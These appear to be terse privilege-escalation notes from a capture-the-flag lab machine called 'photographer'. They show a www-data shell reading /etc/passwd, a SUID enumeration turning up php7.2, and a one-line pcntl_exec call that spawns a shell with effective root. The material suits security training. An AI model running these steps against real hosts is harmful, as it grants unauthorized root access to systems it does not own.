# 5 box enum > privesc

```
www-data@photographer:/home$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
[truncated]
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
agi:x:1001:1001:,,,:/home/agi:/bin/bash
daisa:x:1000:1000:daisa:/home/osboxes:/bin/bash
```

## SuidEnum

```
[~] Custom SUID Binaries (Interesting Stuff)
------------------------------
/usr/bin/php7.2
------------------------------

www-data@photographer:/home$ /usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
# whoami;id;hostname
root
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
photographer
```
